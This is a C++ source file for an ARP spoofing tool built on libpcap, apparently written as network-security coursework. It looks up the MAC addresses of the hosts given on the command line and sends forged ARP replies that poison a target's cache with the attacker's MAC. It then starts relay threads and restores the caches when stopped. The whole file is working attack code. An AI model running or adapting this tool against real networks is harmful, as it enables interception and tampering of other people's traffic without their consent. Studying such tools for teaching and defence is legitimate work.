#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "iphdr.h"
#include "struct.h"
#include "get_attacker_MacIp.h"
#include "pch.h"
#include "thread.h"

vector<MacIpSendTarget> mac_ip_send_target;
uint64_t ip_send_target_num;
MacIp attacker;
const char *interface;
bool thread_party_time = true;
pthread_t pthread_t_pcap_read1;
pthread_t pthread_t_pcap_read2;

Mac send_arp(pcap* pcap, Mac src_mac, MacIp src_macip, Mac des_mac, MacIp des_macip, uint16_t mode){
	char errbuf[PCAP_ERRBUF_SIZE];
	if (pcap == NULL) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return Mac("");
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = des_mac;
	packet.eth_.smac_ = src_mac;
	packet.eth_.type_ = htons(eth_header::arp);

	packet.arp_.hrd_ = htons(HWType::ETHER);
	packet.arp_.pro_ = htons(eth_header::ip4);
	packet.arp_.hln_ = Mac::size;
	packet.arp_.pln_ = Ip::size;
	packet.arp_.op_ = htons(mode);
	packet.arp_.smac_ = src_macip.mac_; 
	packet.arp_.sip_ = src_macip.ip_; 
	packet.arp_.tmac_ = des_macip.mac_;
	packet.arp_.tip_ = des_macip.ip_; 
	
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0)
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));

	while(true){
		pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			return Mac("");
		}

		EthHdr* eth = (EthHdr *)packet;
		ArpHdr* arp = (ArpHdr *)(packet + sizeof(EthHdr));

		if(ntohs(eth->type_) == eth_header::arp && arp->tip_.compare(src_macip.ip_) && arp->sip_.compare(des_macip.ip_))
			return Mac(arp->smac_);
	}
}

void attack(pcap* pcap, Mac src_mac, MacIp src_macip, Mac des_mac, MacIp des_macip, uint16_t mode, char* errbuf){
	if (pcap == NULL) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = des_mac;
	packet.eth_.smac_ = src_mac;
	packet.eth_.type_ = htons(eth_header::arp);

	packet.arp_.hrd_ = htons(HWType::ETHER);
	packet.arp_.pro_ = htons(eth_header::ip4);
	packet.arp_.hln_ = Mac::size;
	packet.arp_.pln_ = Ip::size;
	packet.arp_.op_ = htons(mode);
	packet.arp_.smac_ = src_macip.mac_; 
	packet.arp_.sip_ = src_macip.ip_; 
	packet.arp_.tmac_ = des_macip.mac_;
	packet.arp_.tip_ = des_macip.ip_; 
	
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0){
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
}

void arp_attack(){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	for(int i = 0; i < ip_send_target_num; i++){
		Ip sender_ip = mac_ip_send_target[i].sender_.ip_;
		Mac target_mac = mac_ip_send_target[i].target_.mac_;
		Ip target_ip = mac_ip_send_target[i].target_.ip_;
		attack(pcap, attacker.mac_, MacIp(attacker.mac_, sender_ip), target_mac, MacIp(target_mac, target_ip), OP::Reply, errbuf);
	}
	pcap_close(pcap);

}

void recover(pcap* pcap, Mac src_mac, MacIp src_macip, Mac des_mac, MacIp des_macip, uint16_t mode){
	char errbuf[PCAP_ERRBUF_SIZE];
	if (pcap == NULL) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = des_mac;
	packet.eth_.smac_ = src_mac;
	packet.eth_.type_ = htons(eth_header::arp);

	packet.arp_.hrd_ = htons(HWType::ETHER);
	packet.arp_.pro_ = htons(eth_header::ip4);
	packet.arp_.hln_ = Mac::size;
	packet.arp_.pln_ = Ip::size;
	packet.arp_.op_ = htons(mode);
	packet.arp_.smac_ = src_macip.mac_; 
	packet.arp_.sip_ = src_macip.ip_; 
	packet.arp_.tmac_ = des_macip.mac_;
	packet.arp_.tip_ = des_macip.ip_; 
	
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0){
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
}




void signal_handler(int sig){
	if (sig == SIGTERM || sig == SIGKILL || sig == SIGINT) {
		thread_party_time = false;
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);

		Mac sender_mac = mac_ip_send_target[0].sender_.mac_;
		Ip sender_ip = mac_ip_send_target[0].sender_.ip_;
		Mac target_mac = mac_ip_send_target[0].target_.mac_;
		Ip target_ip = mac_ip_send_target[0].target_.ip_;

		recover(pcap, target_mac, MacIp(target_mac, target_ip), sender_mac, MacIp(sender_mac, sender_ip), OP::Reply);
		recover(pcap, sender_mac, MacIp(sender_mac, sender_ip), target_mac, MacIp(target_mac, target_ip), OP::Reply);

		
		sleep(5);
		pcap_close(pcap);
		exit(0);
	}
}


void start_signal(){
	signal(SIGINT, signal_handler);
	signal(SIGKILL, signal_handler);
	signal(SIGTERM, signal_handler);
}

int main(int argc, char* argv[]) {
	if (argc < 1) {
		printf("syntax: send-arp <interface> <src_ip> <des_ip>\n");
		printf("sample: send-arp wlan0\n");
		return 0;
	}

	interface = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	Mac att_mac = get_attacker_mac();
	Ip att_ip(get_attacker_ip());
	attacker = MacIp(att_mac, att_ip);

	Mac broad_mac("FF:FF:FF:FF:FF:FF");
	Mac unkown_mac("00:00:00:00:00:00");

	pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	for(int i = 2; i < argc - 1; i += 2) {
		Ip sender_ip(argv[i]);
		Ip target_ip(argv[i + 1]);
		Mac sender_mac = send_arp(pcap, att_mac, MacIp(att_mac, att_ip), broad_mac, MacIp(unkown_mac, sender_ip), OP::Request);
		Mac target_mac = send_arp(pcap, att_mac, MacIp(att_mac, att_ip), broad_mac, MacIp(unkown_mac, target_ip), OP::Request);
		mac_ip_send_target.push_back(MacIpSendTarget(MacIp(sender_mac, sender_ip), MacIp(target_mac, target_ip)));
	}
	pcap_close(pcap);

	ip_send_target_num = (argc - 1)/2;
	arp_attack();
	printf("start\n");

	start_signal();
	
	pthread_create(&pthread_t_pcap_read1, NULL, pthread_pcap_read, NULL);
	pthread_create(&pthread_t_pcap_read2, NULL, ptrhead_repeat_send, NULL);

	while(1){
		sleep(1);
	}
}

